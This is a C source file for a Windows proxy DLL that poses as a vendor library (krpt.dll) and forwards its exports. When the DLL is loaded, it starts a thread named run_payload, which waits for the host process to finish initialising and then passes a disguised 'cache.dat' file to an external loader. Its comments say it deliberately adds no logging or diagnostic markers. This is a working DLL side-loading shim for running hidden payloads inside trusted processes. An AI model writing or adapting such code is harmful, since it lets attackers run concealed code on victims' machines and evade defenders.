#include <windows.h>
#include <stddef.h>
#include <string.h>

/*
 * Production comparison proxy for the WPP chain.
 *
 * It deliberately keeps the proxy surface small: resolve the directory of
 * this DLL, locate the existing cache.dat container, and run the profile-only
 * loader once.  The original krpt.dll exports are still supplied by the DEF
 * file generated from the vendor DLL; this file does not add a logging path,
 * environment variable, or per-process diagnostic marker.
 */
extern int dhpl_loader_main(int argc, char** argv);

static HINSTANCE g_instance;
static volatile LONG g_started;

static int cache_path(char* out, size_t out_size)
{
    DWORD n;
    size_t i;
    const char leaf[] = "cache.dat";

    if (!out || out_size < sizeof(leaf)) return 0;
    n = GetModuleFileNameA(g_instance, out, (DWORD)out_size);
    if (!n || n >= (DWORD)out_size) return 0;
    out[n] = 0;
    for (i = (size_t)n; i > 0; --i) {
        if (out[i - 1] == '\\' || out[i - 1] == '/') {
            if (i + sizeof(leaf) - 1 >= out_size) return 0;
            memcpy(out + i, leaf, sizeof(leaf));
            return 1;
        }
    }
    return 0;
}

static DWORD WINAPI run_payload(LPVOID unused)
{
    char path[MAX_PATH * 2];
    char arg0[1] = {0};
    char* argv[3];
    int rc;
    (void)unused;

    /* Keep vendor DLL attach lightweight; map the profile after WPP has
     * completed its normal loader callbacks. */
    Sleep(1200);

    if (!cache_path(path, sizeof(path))) return 2;
    argv[0] = arg0;
    argv[1] = path;
    argv[2] = NULL;
    rc = dhpl_loader_main(2, argv);
    return (DWORD)rc;
}

static void start_once(void)
{
    if (InterlockedCompareExchange(&g_started, 1, 0) != 0) return;
    if (!QueueUserWorkItem(run_payload, NULL, WT_EXECUTEDEFAULT)) {
        InterlockedExchange(&g_started, 0);
        return;
    }
}

BOOL WINAPI DllMain(HINSTANCE instance, DWORD reason, LPVOID reserved)
{
    (void)reserved;
    if (reason == DLL_PROCESS_ATTACH) {
        g_instance = instance;
        DisableThreadLibraryCalls(instance);
        start_once();
    }
    return TRUE;
}
